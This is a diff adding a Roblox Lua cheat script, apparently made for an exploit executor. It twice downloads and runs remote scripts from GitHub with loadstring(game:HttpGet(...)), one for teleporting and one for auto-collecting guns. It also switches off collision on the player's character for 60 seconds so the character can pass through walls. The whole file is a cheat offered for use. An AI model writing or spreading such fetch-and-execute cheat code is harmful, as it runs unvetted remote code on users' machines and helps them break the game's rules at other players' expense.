@@ -1,0 +1,39 @@
+local player = game.Players.LocalPlayer
+
+-- Start teleporting immediately (equivalent to clicking "Yes")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/goondiety/TP/refs/heads/main/lab"))()
+
+task.delay(math.random(5, 6), function()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local humanoid = character:WaitForChild("Humanoid")
+    local runService = game:GetService("RunService")
+
+    if humanoid then
+        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+    end
+
+    local function enableNoClip()
+        for _, part in pairs(character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = false
+            end
+        end
+    end
+
+    local function disableNoClip()
+        for _, part in pairs(character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = true
+            end
+        end
+    end
+
+    local noclipConnection = runService.Stepped:Connect(enableNoClip)
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/m00ndiety/68BJN/refs/heads/main/Auto-collect-gun.lua.txt"))()
+
+    task.delay(60, function()
+        noclipConnection:Disconnect()
+        disableNoClip()
+    end)
+end)
